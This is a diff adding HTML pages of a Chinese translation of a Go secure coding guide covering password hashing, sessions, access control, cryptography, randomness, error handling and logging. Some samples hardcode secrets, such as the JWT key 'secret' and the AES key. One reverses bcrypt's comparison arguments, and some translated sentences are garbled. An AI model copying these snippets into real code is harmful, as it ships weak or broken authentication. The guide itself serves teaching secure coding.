+    // fmt.Printf(&quot;salt    : %x\n&quot;, salt)
+    // fmt.Printf(&quot;hash    : %x\n&quot;, hash.Sum(nil))
+
+    // you're supposed to have a database connection
+    stmt, err := db.PrepareContext(ctx, &quot;INSERT INTO accounts SET hash=?, salt=?, email=?&quot;)
+    if err != nil {
+        panic(err)
+    }
+    result, err := stmt.ExecContext(ctx, email, h, salt)
+    if err != nil {
+        panic(err)
+    }
+
+}
+</code></pre>
+
+<p>然而，这种方法有几个缺陷，不应该使用。本文仅用一个实例来说明这一理论。下一节将解释如何在现实生活中正确设置密码。</p>
+<h4 id="_19">安全存储密码实践</h4>
+<p>下面的示例演示如何使用bcrypt，这对于大多数情况都是足够好的。BCRYPT的优点是使用起来更简单，因此不易出错。</p>
+<pre><code class="go">package main
+
+import (
+    &quot;database/sql&quot;
+    &quot;context&quot;
+    &quot;fmt&quot;
+
+    &quot;golang.org/x/crypto/bcrypt&quot;
+)
+
+func main() {
+    ctx := context.Background()
+    email := []byte(&quot;john.doe@somedomain.com&quot;)
+    password := []byte(&quot;47;u5:B(95m72;Xq&quot;)
+
+    // Hash the password with bcrypt
+    hashedPassword, err := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)
+    if err != nil {
+        panic(err)
+    }
+
+    // this is here just for demo purposes
+    //
+    // fmt.Printf(&quot;email          : %s\n&quot;, string(email))
+    // fmt.Printf(&quot;password       : %s\n&quot;, string(password))
+    // fmt.Printf(&quot;hashed password: %x\n&quot;, hashedPassword)
+
+    // you're supposed to have a database connection
+    stmt, err := db.PrepareContext(ctx, &quot;INSERT INTO accounts SET hash=?, email=?&quot;)
+    if err != nil {
+        panic(err)
+    }
+    result, err := stmt.ExecContext(ctx, hashedPassword, email)
+    if err != nil {
+        panic(err)
+    }
+}
+</code></pre>
+
+<p>bcrypt还提供了一种简单而安全的方法来比较明文密码和已经散列的密码：</p>
+<pre><code class="go">ctx := context.Background()
+
+ // credentials to validate
+ email := []byte(&quot;john.doe@somedomain.com&quot;)
+ password := []byte(&quot;47;u5:B(95m72;Xq&quot;)
+
+// fetch the hashed password corresponding to the provided email
+record := db.QueryRowContext(ctx, &quot;SELECT hash FROM accounts WHERE email = ? LIMIT 1&quot;, email)
+
+var expectedPassword string
+if err := record.Scan(&amp;expectedPassword); err != nil {
+    // user does not exist
+
+    // this should be logged (see Error Handling and Logging) but execution
+    // should continue
+}
+
+if bcrypt.CompareHashAndPassword(password, []byte(expectedPassword)) != nil {
+    // passwords do not match
+
+    // passwords mismatch should be logged (see Error Handling and Logging)
+    // error should be returned so that a GENERIC message &quot;Sign-in attempt has
+    // failed, please check your credentials&quot; can be shown to the user.
+}
+</code></pre>
+
+<hr />
+<h3 id="_20">密码策略</h3>
+<p>密码是一种历史资产，是大多数认证系统的一部分，也是攻击者的头号目标。</p>
+<p>很多时候一些服务会泄露用户的信息，尽管电子邮件地址和其他个人数据也泄露了，但最大的问题是密码。为什么？因为密码不容易管理和记忆，用户倾向于使用弱密码（例如“123456”）他们可以很容易记住，也可以在不同的服务中使用相同的密码。</p>
+<p>如果您的应用程序登录需要密码，您可以做的最好的事情是"强制执行密码复杂性要求，要求使用字母以及数字和/或特殊字符"。密码长度也应该强制要求："通常使用8个字符，但16个字符更好，或者考虑使用多个单词的密码短语"。</p>
+<p>当然，前面的指导原则都不会阻止用户重新使用相同的密码。最好的办法是"强制更改密码"，防止密码重复使用。关键系统可能需要更频繁的更改，必须对重置之间的时间进行管理控制”。</p>
+<h4 id="_21">重置</h4>
+<p>即使您没有应用任何额外的密码策略，用户仍然需要能够重置他们的密码。这种机制与注册或登录一样重要，我们鼓励您遵循最佳实践，确保您的系统不会泄露敏感数据，也不会受到危害。</p>
+<p>"密码更改时间不能少于1天"。这样可以防止对密码重复使用的攻击。每当使用"基于电子邮件的重置，只发送电子邮件到预先注册的地址与临时链接/密码"，这个链接应该有一个很短的到期时间。</p>
+<p>每当请求密码重置时应通知用户。同样临时密码也应该在下次使用时更改。</p>
+<p>密码重置的一个常见做法是"安全问题"，其答案以前是由帐户所有者配置的。密码重置问题应支持足够的随机答案：询问"最喜爱的书"？可能答案总会是"圣经"，这使得这个安全问题成为一个坏问题。</p>
+<h3 id="_22">其它指南</h3>
+<p>身份验证是任何系统的关键部分，因此您应该始终采用正确和安全的做法。以下是使您的认证系统更具弹性的一些指导原则：</p>
+<ul>
+<li>在执行关键操作之前重新验证用户身份；</li>
+<li>对高度敏感或高价值交易帐户使用多因素身份验证；</li>
+<li>利用相同的密码，实施监控以识别针对多个用户帐户的攻击。当用户ID可以被获取或猜测时，这种攻击模式用于绕过标准锁定；</li>
+<li>更改供应商提供的所有默认密码和用户ID或禁用关联帐户；</li>
+<li>在已确定的无效登录尝试次数（例如：五次尝试是常见的）后强制禁用帐户。必须禁用该帐户一段时间，这段时间必须足以阻止对凭据的野蛮猜测，但不能长到允许执行拒绝服务攻击。</li>
+</ul>
+<h2 id="session">Session管理</h2>
+<p>在本节中，我们会根据OWASP安全编码实践来介绍会话管理的重要内容。提供了一个示例以及实践原理概述。除此之外，还有一个包含完整程序代码的文件夹。会话进程如图所示：</p>
+<p><img alt="session-management-1" src="https://checkmarx.gitbooks.io/go-scp/content/session-management/img/SessionManagementOverview.png" /></p>
+<p>在处理会话管理时，应用程序应该只识别服务器中的会话管理控件，并在在受信任的系统上创建会话。在提供的代码示例中，我们的应用程序使用JWT生成一个会话，代码如下：</p>
+<pre><code class="go">// create a JWT and put in the clients cookie
+func setToken(res http.ResponseWriter, req *http.Request) {
+    ...
+}
+</code></pre>
+
+<p>我们必须确保用于生成会话标识符的算法是足够随机的，以防止会话被暴力破解，代码如下：</p>
+<pre><code class="go">...
+token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+signedToken, _ := token.SignedString([]byte(&quot;secret&quot;)) //our secret
+...
+</code></pre>
+
+<p>既然又了足够强的令牌，我们必须给cookie设置<code>Domain</code>、<code>Path</code>、<code>Expires</code>、<code>HTTPOnly</code>、<code>Secure</code>等参数。通常情况下，我们把Expires值设置为30分钟以此来降低应用程序风险。</p>
+<pre><code class="go">// Our cookie parameter
+cookie := http.Cookie{
+    Name: &quot;Auth&quot;,
+    Value: signedToken,
+    Expires: expireCookie,
+    HttpOnly: true,
+    Path: &quot;/&quot;,
+    Domain: &quot;127.0.0.1&quot;,
+    Secure: true
+}
+
+http.SetCookie(res, &amp;cookie) //Set the cookie
+</code></pre>
+
+<p>每次成功登录后都会生成新的会话，历史会话将不会被重新使用，即使它没有过期。我们还可以使用Expire参数强制定期终止会话，以防止会话劫持。Cookie的另外一个重要因素是不允许同一用户同时登录，这可以通过保存登录用户列表完成，将新的登录用户名与列表进行对比，登录用户列表通常保存在数据库中。</p>
+<p>会话标识符不允许存储在URL中，仅允许保存在HTTP Cookie头中。一个不好的列子就是使用GET传递会话标识符参数。会话数据还必须受到保护，以防服务器的其它用户未经授权直接访问。</p>
+<p>HTTP改为HTTPS，防止网络嗅探会话的MITM攻击。最佳实践是在所有的请求中使用HTTPS，代码如下：</p>
+<pre><code class="go">err := http.ListenAndServeTLS(&quot;:443&quot;, &quot;cert/cert.pem&quot;, &quot;cert/key.pem&quot;, nil)
+if err != nil {
+    log.Fatal(&quot;ListenAndServe: &quot;, err)
+}
+</code></pre>
+
+<p>在高敏感或关键操作的请求中，应该为每个请求而不是每个会话生成令牌。始终确保令牌的随机性，并且足有足够的安全长度防止暴力破解。</p>
+<p>在会话管理中要考虑的最后一个方面是注销功能。应用程序应该提供一个从所有需要身份验证的页面注销的方法，并完全终止关联的会话和链接。示例中，当用户注销时，cookie需要从客户端删除，也需要从服务端删除。</p>
+<pre><code class="go">...
+cookie, err := req.Cookie(&quot;Auth&quot;) //Our auth token
+if err != nil {
+    res.Header().Set(&quot;Content-Type&quot;, &quot;text/html&quot;)
+    fmt.Fprint(res, &quot;Unauthorized - Please login &lt;br&gt;&quot;)
+    fmt.Fprintf(res, &quot;&lt;a href=\&quot;login\&quot;&gt; Login &lt;/a&gt;&quot;)
+    return
+}
+...
+</code></pre>
+
+<p>完整的例子，请访问：<a href="https://checkmarx.gitbooks.io/go-scp/content/session-management/session.go">session.go</a></p>
+<h2 id="_23">访问控制</h2>
+<p>在处理访问控制时，要采取的第一步是仅使用受信任的系统对象进行访问授权决策。在<a href="https://checkmarx.gitbooks.io/go-scp/content/session-management/">会话管理</a>部分提供的示例中，我们使用JWT实现了这一点。JSONWeb令牌在服务器端生成会话令牌。</p>
+<pre><code class="go">// create a JWT and put in the clients cookie
+func setToken(res http.ResponseWriter, req *http.Request) {
+    //30m Expiration for non-sensitive applications - OWASP
+    expireToken := time.Now().Add(time.Minute * 30).Unix()
+    expireCookie := time.Now().Add(time.Minute * 30)
+
+    //token Claims
+    claims := Claims{
+        {...}
+    }
+
+    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+    signedToken, _ := token.SignedString([]byte(&quot;secret&quot;))
+</code></pre>
+
+<p>然后我们可以存储和使用这个令牌来验证用户并强制我们的访问控制模型。</p>
+<p>用于访问授权的组件应该是一个单一的、在站点范围内使用的组件。这包括调用外部授权服务的库。</p>
+<p>如果出现故障，访问控制应安全失效。在Go中，我们可以使用Defer来实现这一点。有关详细信息，请参阅文档的<a href="https://checkmarx.gitbooks.io/go-scp/content/error-handling-logging/error-handling.html">错误日志</a>部分。</p>
+<p>如果应用程序无法访问其配置信息，则应拒绝对应用程序的所有访问。</p>
+<p>应该对每个请求实施授权控制，包括服务器端脚本以及来自客户端技术（如Ajax或Flash）的请求。</p>
+<p>正确地将特权逻辑与应用程序代码的其余部分分开也是很重要的。</p>
+<p>为防止未经授权的用户访问，必须执行访问控制的其他重要操作包括：</p>
+<ul>
+<li>文件和其他资源</li>
+<li>受保护的URL</li>
+<li>受保护功能</li>
+<li>直接对象引用</li>
+<li>服务</li>
+<li>应用程序数据</li>
+<li>用户和数据属性以及策略信息</li>
+</ul>
+<p>在提供的示例中，测试简单的直接对象引用。<a href="https://checkmarx.gitbooks.io/go-scp/content/access-control/URL.go">此代码基于会话管理中的示例构建</a>。</p>
+<p>在实现这些访问控制时，重要的是验证访问控制规则的服务器端实现和表示层表示是否匹配。</p>
+<p>如果状态数据需要存储在客户端，则需要使用加密和完整性检查以防止篡改。</p>
+<p>应用程序逻辑流必须符合业务规则。</p>
+<p>处理事务时，单个用户或设备在给定时间段内可以执行的事务数必须高于业务要求，但必须足够低，以防止用户执行DoS类型的攻击。</p>
+<p>重要的是要注意，仅使用referer HTTP头不足以验证授权，应仅用作补充检查。</p>
+<p>对于经过长时间验证的会话，应用程序应定期重新评估用户的授权，以验证用户的权限是否未更改。如果权限已更改，请注销用户并强制他们重新进行身份验证。</p>
+<p>为了遵守安全程序，用户帐户还应该有一种审计方法。（例如，在密码过期30天后禁用用户帐户）。</p>
+<p>应用程序还必须支持在用户的授权被撤销时禁用帐户和终止会话。（例如角色变更、就业状况等）。</p>
+<p>当支持外部服务帐户和支持从外部系统或到外部系统的连接的帐户时，这些帐户必须以尽可能低的权限级别运行。</p>
+<h2 id="_24">密码学实践</h2>
+<p>让我们让第一句话像您的加密技术一样强大：<strong>哈希和加密是两种不同的东西</strong>。</p>
+<p>这是一个普遍的误解，而且大多数时候哈希和加密是交替使用的，错误的。它们是不同的概念，也有不同的用途。</p>
+<p>哈希是由（哈希）函数从源数据生成的字符串或数字：</p>
+<pre><code class="go">hash := F(data)
+</code></pre>
+
+<p>哈希的长度固定，其值随输入的微小变化而变化很大（仍可能发生冲突）。好的哈希算法不允许将哈希转换为其原始源。MD5是最流行的散列算法，但安全性<a href="https://blake2.net/">blake2</a>被认为是最强和最灵活的。</p>
+<p>Go补充加密库提供了<a href="https://godoc.org/golang.org/x/crypto/blake2b">blake2b</a>（或仅blake2）和<a href="https://godoc.org/golang.org/x/crypto/blake2s">blake2s</a>实现：前者针对64位平台进行了优化，后者针对8到32位平台进行了优化。如果blake2不可用，则sha-256是正确的选项。</p>
+<p>每当你有一些你不需要知道它是什么的东西，但只有当它是应该是什么的时候（比如下载后检查文件完整性），你应该使用hashing</p>
+<pre><code class="go">package main
+
+import &quot;fmt&quot;
+import &quot;io&quot;
+import &quot;crypto/md5&quot;
+import &quot;crypto/sha256&quot;
+import &quot;golang.org/x/crypto/blake2s&quot;
+
+func main () {
+        h_md5 := md5.New()
+        h_sha := sha256.New()
+        h_blake2s, _ := blake2s.New256(nil)
+        io.WriteString(h_md5, &quot;Welcome to Go Language Secure Coding Practices&quot;)
+        io.WriteString(h_sha, &quot;Welcome to Go Language Secure Coding Practices&quot;)
+        io.WriteString(h_blake2s, &quot;Welcome to Go Language Secure Coding Practices&quot;)
+        fmt.Printf(&quot;MD5        : %x\n&quot;, h_md5.Sum(nil))
+        fmt.Printf(&quot;SHA256     : %x\n&quot;, h_sha.Sum(nil))
+        fmt.Printf(&quot;Blake2s-256: %x\n&quot;, h_blake2s.Sum(nil))
+}
+</code></pre>
+
+<p>输出</p>
+<pre><code class="go">MD5        : ea9321d8fb0ec6623319e49a634aad92
+SHA256     : ba4939528707d791242d1af175e580c584dc0681af8be2a4604a526e864449f6
+Blake2s-256: 1d65fa02df8a149c245e5854d980b38855fd2c78f2924ace9b64e8b21b3f2f82
+</code></pre>
+
+<p><strong>注意</strong>：要运行源代码示例，您需要运行<code>$go get golang.org/x/crypto/blake2s</code></p>
+<p>另一方面，加密使用密钥将数据转换为可变长度的数据</p>
+<pre><code class="go">encrypted_data := F(data, key)
+</code></pre>
+
+<p>与散列不同，我们可以使用正确的解密函数和密钥，从加密的数据中计算数据。</p>
+<pre><code class="go">data := F⁻¹(encrypted_data, key)
+</code></pre>
+
+<p>当您需要通信或存储敏感数据时，应使用加密，您或其他人稍后需要访问这些敏感数据进行进一步处理。一个“简单”的加密用例是安全的https-hyper-text传输协议。AES是对称密钥加密的事实标准。该算法和其他对称密码一样，可以在不同的模式下实现。您会注意到在下面的代码示例中，使用了gcm（galois counter模式），而不是更流行的（至少在密码学代码示例中）cbc/ecb。GCM和CBC/ECB之间的主要区别在于前者是一种经过身份验证的密码模式，这意味着在加密阶段之后，在密文中添加一个身份验证标签，然后在消息解密之前对其进行验证，以确保消息没有被篡改。另一方面，您有公钥密码术或使用成对密钥的非对称密码术：public和private。在大多数情况下，公钥密码学的性能不如对称密钥密码学，因此其最常见的用例是使用非对称密码学在双方之间共享对称密钥，这样他们就可以使用对称密钥交换使用对称密码学加密的消息。除了90年代的AES技术外，Go作者已经开始实施和支持更现代的对称加密算法，这些算法也提供身份验证，例如chacha20poly1305。</p>
+<p>Go中另一个有趣的包是x/crypto/nacl。这是DanielJ.Bernstein博士的Nacl图书馆的参考资料，它是一个非常流行的现代密码学图书馆。go中的nacl/box和nacl/secretbox是nacl为两个最常见的用例发送加密消息的抽象实现：</p>
+<ul>
+<li>使用公钥加密（nacl/box）在双方之间发送经过身份验证的加密消息</li>
+<li>使用对称（即密钥）加密技术在双方之间发送经过身份验证的加密消息</li>
+</ul>
+<p>如果符合您的用例，那么最好使用其中一个抽象，而不是直接使用AES。</p>
+<pre><code class="go">package main
+
+import &quot;fmt&quot;
+import &quot;crypto/aes&quot;
+import &quot;crypto/cipher&quot;
+import &quot;crypto/rand&quot;
+
+func main() {
+        key := []byte(&quot;Encryption Key should be 32 char&quot;)
+        data := []byte(&quot;Welcome to Go Language Secure Coding Practices&quot;)
+
+        block, err := aes.NewCipher(key)
+        if err != nil {
+                panic(err.Error())
+        }
+
+        nonce := make([]byte, 12)
+        if _, err := rand.Read(nonce); err != nil {
+                panic(err.Error())
+        }
+
+        aesgcm, err := cipher.NewGCM(block)
+        if err != nil {
+                panic(err.Error())
+        }
+
+        encrypted_data := aesgcm.Seal(nil, nonce, data, nil)
+        fmt.Printf(&quot;Encrypted: %x\n&quot;, encrypted_data)
+
+        decrypted_data, err := aesgcm.Open(nil, nonce, encrypted_data, nil)
+        if err != nil {
+                panic(err.Error())
+        }
+
+        fmt.Printf(&quot;Decrypted: %s\n&quot;, decrypted_data)
+}
+</code></pre>
+
+<pre><code class="go">Encrypted: a66bd44db1fac7281c33f6ca40494a320644584d0595e5a0e9a202f8aeb22dae659dc06932d4e409fe35a95d14b1cffacbe3914460dd27cbd274b0c3a561
+Decrypted: Welcome to Go Language Secure Coding Practices
+</code></pre>
+
+<p>请注意，您应该“建立并使用一个如何管理加密密钥的策略和过程”，保护“主秘密不受未经授权的访问”。也就是说：您的加密密钥不应该硬编码在源代码中（如本例中所示）。</p>
+<p><a href="https://golang.org/pkg/crypto/">go crypto package</a>收集常见的加密常量，但实现有自己的包，如crypto/md5包。</p>
+<p>大多数现代密码算法都是在<code>https://godoc.org/golang.org/x/crypto</code>下实现的，因此开发人员应该关注那些算法，而不是<code>[crypto/*package](https://golang.org/pkg/crypto/)</code>。</p>
+<h3 id="_25">伪随机生成器</h3>
+<p>在OWASP安全编码实践中，您会发现一条似乎非常复杂的准则：“当这些随机值不可猜测时，所有随机数、随机文件名、随机guid和随机字符串都应使用加密模块批准的随机数生成器生成”，因此让我们来谈谈“随机数”。</p>
+<p>密码学依赖于某种随机性，但为了正确起见，大多数编程语言提供的现成的是一个伪随机数生成器：<a href="https://golang.org/pkg/math/rand/">go's math/rand</a>不例外。</p>
+<p>当文档中声明“顶级函数（如float64和int）使用默认共享源时，您应该仔细阅读该文档，该共享源每次运行程序时都会生成确定的值序列。”（<a href="https://golang.org/pkg/math/rand/#pkg-overview">source</a>）</p>
+<p>这到底是什么意思？让我们看看</p>
+<pre><code class="go">package main
+
+import &quot;fmt&quot;
+import &quot;math/rand&quot;
+
+func main() {
+    fmt.Println(&quot;Random Number: &quot;, rand.Intn(1984))
+}
+</code></pre>
+
+<p>运行这个程序几次会导致完全相同的数字/序列，但是为什么呢？</p>
+<pre><code class="go">$ for i in {1..5}; do go run rand.go; done
+Random Number:  1825
+Random Number:  1825
+Random Number:  1825
+Random Number:  1825
+Random Number:  1825
+</code></pre>
+
+<p>因为<a href="https://golang.org/pkg/math/rand/">Go's Math/Rand</a>和其他许多方法一样是一个确定性伪随机数生成器，所以它们使用一个称为seed的源。这个种子只负责确定性伪随机数生成器的随机性——如果已知或可预测，生成的数字序列也会发生同样的情况。</p>
+<p>我们可以通过使用<a href="https://golang.org/pkg/math/rand/#Seed">math/rand seed function</a>为每个程序执行获取预期的五个不同值来“修复”这个例子，但是因为我们在cryptographic practices部分，所以我们应该遵循<a href="https://golang.org/pkg/crypto/rand/">go's crypto/rand package</a>。</p>
+<pre><code class="go">package main
+
+import &quot;fmt&quot;
+import &quot;math/big&quot;
+import &quot;crypto/rand&quot;
+
+func main() {
+    rand, err := rand.Int(rand.Reader, big.NewInt(1984))
+    if err != nil {
+        panic(err)
+    }
+
+    fmt.Printf(&quot;Random Number: %d\n&quot;, rand)
+}
+</code></pre>
+
+<p>您可能会注意到运行<a href="https://golang.org/pkg/crypto/rand/">crypto/rand</a>比<a href="https://golang.org/pkg/math/rand/">math/rand</a>慢，但这是意料之中的：最快的算法并不总是最安全的。crypto的rand实现起来也更安全；一个例子是，您不能种子crypto/rand，库为此使用操作系统随机性，防止开发人员滥用。</p>
+<pre><code class="go">$ for i in {1..5}; do go run rand-safe.go; done
+Random Number: 277
+Random Number: 1572
+Random Number: 1793
+Random Number: 1328
+Random Number: 1378
+</code></pre>
+
+<p>如果您对如何利用这一点很好奇，那么想想如果您的应用程序在用户注册时创建一个默认密码，通过计算用<a href="https://golang.org/pkg/math/rand/">go's math/rand</a>生成的伪随机数的散列值，会发生什么情况，如第一个示例所示？</p>
+<p>是的，你猜对了，你就可以预测用户的密码了！</p>
+<h2 id="_26">错误处理和记录</h2>
+<p>错误处理和日志记录是应用程序和基础结构保护的重要组成部分。当提到错误处理时，它是指捕获应用程序逻辑中可能导致系统崩溃的任何错误，除非正确处理。另一方面，日志记录详细说明了系统上发生的所有操作和请求。日志记录不仅允许识别已发生的所有操作，而且有助于确定需要采取哪些措施来保护系统。由于攻击者有时试图通过删除日志来删除其操作的所有跟踪，因此集中化日志至关重要。</p>
+<h3 id="_27">错误处理</h3>
+<p>在Go中，有一个内置的<code>error</code>类型。<code>error</code>类型的不同值表示异常状态。通常在go中，如果错误值不是nil，则会发生一个错误，并且必须进行处理，以便允许应用程序在不崩溃的情况下从所述状态恢复。</p>
+<p>Go中的一个简单示例如下：</p>
+<pre><code class="go">if err != nil {
+    // handle the error
+}
+</code></pre>
+
+<p>不仅可以使用内置错误，还可以指定自己的错误类型。这可以通过使用erro.New 函数。例子：</p>
+<pre><code class="go">{...}
+if f &lt; 0 {
+    return 0, errors.New(&quot;math: square root of negative number&quot;)
+}
+//If an error has occurred print it
+if err != nil {
+    fmt.Println(err)
+}
+{...}
+</code></pre>
+
+<p>为了防止我们需要格式化包含无效参数的字符串来查看是什么导致了错误，<code>fmt</code>包中的<code>errorf</code>函数允许我们这样做。</p>
+<pre><code class="go">{...}
+if f &lt; 0 {
+    return 0, fmt.Errorf(&quot;math: square root of negative number %g&quot;, f)
+}
+{...}
+</code></pre>
+
+<p>在处理错误日志时，开发人员应确保在错误响应中不泄漏敏感信息，并确保没有错误处理程序泄漏信息（例如调试或堆栈跟踪信息）。</p>
+<p>在Go中还有额外的错误处理函数，这些函数是恐慌、恢复和延迟。当一个应用程序处于死机状态时，它的正常执行被中断，任何延迟语句被执行，然后函数返回给它的调用方。recover通常在defer语句中使用，并允许应用程序重新获得对恐慌例程的控制权，然后返回正常执行。以下代码段基于Go文档解释了执行流程：</p>
+<pre><code class="go">func main () {
+    start()
+    fmt.Println(&quot;Returned normally from start().&quot;)
+}
+
+func start () {
+    defer func () {
+        if r := recover(); r != nil {
+            fmt.Println(&quot;Recovered in start()&quot;)
+        }
+    }()
+    fmt.Println(&quot;Called start()&quot;)
+    part2(0)
+    fmt.Println(&quot;Returned normally from part2().&quot;)
+}
+
+func part2 (i int) {
+    if i &gt; 0 {
+        fmt.Println(&quot;Panicking in part2()!&quot;)
+        panic(fmt.Sprintf(&quot;%v&quot;, i))
+    }
+    defer fmt.Println(&quot;Defer in part2()&quot;)
+    fmt.Println(&quot;Executing part2()&quot;)
+    part2(i + 1)
+}
+</code></pre>
+
+<p>输出：</p>
+<pre><code class="go">Called start()
+Executing part2()
+Panicking in part2()!
+Defer in part2()
+Recovered in start()
+Returned normally from start().
+</code></pre>
+
+<p>通过检查输出，我们可以看到Go如何处理紧急情况并从中恢复，从而允许应用程序恢复其正常状态。这些函数允许从原本不可恢复的故障中进行优雅的恢复。</p>
+<p>值得注意的是，延迟使用还包括互斥锁解锁，或者在执行了周围的函数（例如页脚）之后加载内容。</p>
+<p>在日志包中还有一个log.fatal。致命级别是有效地记录消息，然后调用os.exit（1）。这意味着：</p>
+<ul>
+<li>将不执行defer语句。</li>
+<li>缓冲区将不会被刷新。</li>
+<li>不会删除临时文件和目录。</li>
+</ul>
+<p>考虑到前面提到的所有点，我们可以看到log.fatal与恐慌的区别，以及应该谨慎使用它的原因。可能使用log.fatal的一些示例包括：</p>
+<ul>
+<li>设置日志记录并检查我们是否有健全的环境和参数。如果我们不这样做，那么就不需要执行main（）。</li>
+<li>一个永远不会发生的错误，我们知道它是不可恢复的。</li>
+<li>如果一个非交互进程遇到错误而无法完成，则无法将此错误通知用户。最好先停止执行，然后再从失败中出现其他问题。</li>
+</ul>
+<p>初始化失败的例子说明：</p>
+<pre><code class="go">func init(i int) {
+    ...
+    //This is just to deliberately crash the function.
+    if i &lt; 2 {
+        fmt.Printf(&quot;Var %d - initialized\n&quot;, i)
+    } else {
+        //This was never supposed to happen, so we'll terminate our program.
+        log.Fatal(&quot;Init failure - Terminating.&quot;)
+    }
+}
+
+func main() {
+    i := 1
+    for i &lt; 3 {
+        init(i)
+        i++
+    }
+    fmt.Println(&quot;Initialized all variables successfully&quot;)
+</code></pre>
+
+<p>重要的是要确保在与安全控制相关联的错误情况下，默认情况下拒绝访问。</p>
+<h3 id="_28">日志</h3>
+<p>日志记录应始终由应用程序处理，不应依赖服务器配置。</p>
+<p>所有日志记录都应该由受信任系统上的主例程实现，开发人员还应该确保日志中不包含敏感数据（例如密码、会话信息、系统详细信息等），也不存在任何调试或堆栈跟踪信息。此外，日志记录应该包括成功和失败的安全事件，重点是重要的日志事件数据。</p>
+<p>重要事件数据通常指：</p>
+<ul>
+<li>所有输入验证失败。</li>
+<li>所有身份验证尝试，尤其是失败。</li>
+<li>所有访问控制失败。</li>
+<li>所有明显的篡改事件，包括对状态数据的意外更改。</li>
+<li>使用无效或过期的会话令牌进行连接的所有尝试。</li>
+<li>所有系统异常。</li>
+<li>所有管理功能，包括对安全配置设置的更改。</li>
+<li>所有后端TLS连接故障和加密模块故障。</li>
+</ul>
+<p>一个简单的日志示例说明了这一点：</p>
+<pre><code class="go">func main() {
+    var buf bytes.Buffer
+    var RoleLevel int
+
+    logger := log.New(&amp;buf, &quot;logger: &quot;, log.Lshortfile)
+
+    fmt.Println(&quot;Please enter your user level.&quot;)
+    fmt.Scanf(&quot;%d&quot;, &amp;RoleLevel) //&lt;--- example
+
+    switch RoleLevel {
+    case 1:
+        // Log successful login
+        logger.Printf(&quot;Login successfull.&quot;)
+        fmt.Print(&amp;buf)
+    case 2:
+        // Log unsuccessful Login
+        logger.Printf(&quot;Login unsuccessful - Insufficient access level.&quot;)
+        fmt.Print(&amp;buf)
+     default:
+        // Unspecified error
+        logger.Print(&quot;Login error.&quot;)
+        fmt.Print(&amp;buf)
+    }
+}
+</code></pre>
+
+<p>实现通用错误消息或自定义错误页也是一个好的实践，以确保在发生错误时不会泄漏任何信息。</p>
+<p>根据文档，<a href="https://golang.org/pkg/log/">Go log package</a> “实现简单的日志记录”，缺少一些常见和重要的功能，例如级别化的日志记录（例如，调试、信息、警告、错误、致命、死机）和格式化程序支持（例如，logstash）：这是使日志可用的两个重要功能（例如，用于与安全信息和事件集成）管理体系）。</p>
+<p>大多数（如果不是全部）第三方日志记录包都提供这些功能和其他功能。以下是一些后流行的第三方日志记录包：</p>
+<ul>
+<li>Logrus - https://github.com/Sirupsen/logrus</li>
+<li>glog - https://github.com/golang/glog</li>
+<li>loggo - https://github.com/juju/loggo</li>
+</ul>
+<p>关于<a href="https://golang.org/pkg/log/">Go's log package</a>的一个重要注意事项是：致命的和紧急的函数都比日志功能做得更多。panic函数在写入日志消息后调用panic库通常不接受的内容，而致命的函数调用os。在写入日志消息后退出（1）可能终止程序以阻止延迟语句运行、要刷新的缓冲区和/或要删除的临时数据。</p>
+<p>从日志访问的角度来看，只有授权的个人才可以访问日志。开发人员还应确保设置了允许日志分析的机制，并确保不受信任的数据不会作为代码在预期的日志查看软件或界面中执行。</p>
+<p>关于分配的内存清理，Go有一个内置的垃圾收集器。</p>
+<p>作为确保日志有效性和完整性的最后一步，应使用加密哈希函数作为附加步骤，以确保不会发生日志篡改。</p>
+<pre><code class="go">{...}
+// Get our known Log checksum from checksum file.
+logChecksum, err := ioutil.ReadFile(&quot;log/checksum&quot;)
+str := string(logChecksum) // convert content to a 'string'
+
+// Compute our current log's MD5
+b, err := ComputeMd5(&quot;log/log&quot;)
+if err != nil {
+  fmt.Printf(&quot;Err: %v&quot;, err)
+} else {
+  md5Result := hex.EncodeToString(b)
+  // Compare our calculated hash with our stored hash
+  if str == md5Result {
+    // Ok the checksums match.
+    fmt.Println(&quot;Log integrity OK.&quot;)
+  } else {
+    // The file integrity has been compromised...
+    fmt.Println(&quot;File Tampering detected.&quot;)
+  }
+}
+{...}
+</code></pre>
+
+<p><strong>注意</strong>：<code>computemd5()</code> 函数计算文件的md5。同样重要的是，必须将日志文件哈希存储在安全的地方，并与当前日志哈希进行比较，以在对日志进行任何更新之前验证完整性。文档中包含完整的源代码。</p>
+<h2 id="_29">数据保护</h2>
+<p>现如今，安全中最重要的事情之一就是数据保护。你不会想要：
+<img alt="cB52MA.jpeg" src="https://checkmarx.gitbooks.io/go-scp/data-protection/files/cB52MA.jpeg" /></p>
+<p>简而言之，Web应用程序中的数据需要受到保护，因此在本节中，我们将研究保护数据的不同方法。
+你应该注意的第一件事是为每个用户创建和实现正确的权限，并将用户仅限于他们真正需要的功能。
+例如，考虑一个具有以下用户角色的简单在线商店：</p>
+<ul>
+<li>销售用户：只允许查看目录</li>
+<li>营销用户：允许查看统计数据</li>
+<li>开发人员：允许修改页面和web应用程序选项</li>
+</ul>
+<p>此外，在系统配置(又称为web服务器)中，应该定义正确的权限。
+主要是为每个用户定义正确的角色 —— web用户或系统用户。
+<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion">访问控制</a>部分，将进一步讨论角色分离和访问控制。</p>
+<h3 id="_30">删除敏感信息</h3>
+<p>包含敏感信息的临时文件和缓存文件应该在不需要时立即删除。如果你仍然需要它们中的某些内容，将它们移到受保护的区域或对它们加密。</p>
+<h4 id="_31">注释</h4>
+<p>有时候开发人员会在源代码中留下类似于To-do列表的注释，还有时候，在最坏的情况下，开发人员可能会留下凭证。</p>
+<pre><code class="go">// Secret API endpoint - /api/mytoken?callback=myToken
+fmt.Println(&quot;Just a random code&quot;)
+</code></pre>
+
+<p>在上面的例子中，开发人员在注释中有一个<code>endpoint</code>，如果没有得到很好的保护，则可能被恶意用户使用。</p>
+<h4 id="url_1">URL</h4>
+<p>使用HTTP GET方法传递敏感信息会使web应用程序容易受到攻击，因为：
+1. 如果不使用HTTPS，通过MITM攻击，数据可能被拦截。
+2. 浏览器历史记录存储用户的信息。如果URL中，带有未过期的<code>session IDs</code>、<code>pins</code>或<code>tokens</code>(或低熵值)，则它们可能被窃取。</p>
+<pre><code class="go">req, _ := http.NewRequest(&quot;GET&quot;, &quot;http://mycompany.com/api/mytoken?api_key=000s3cr3t000&quot;, nil)
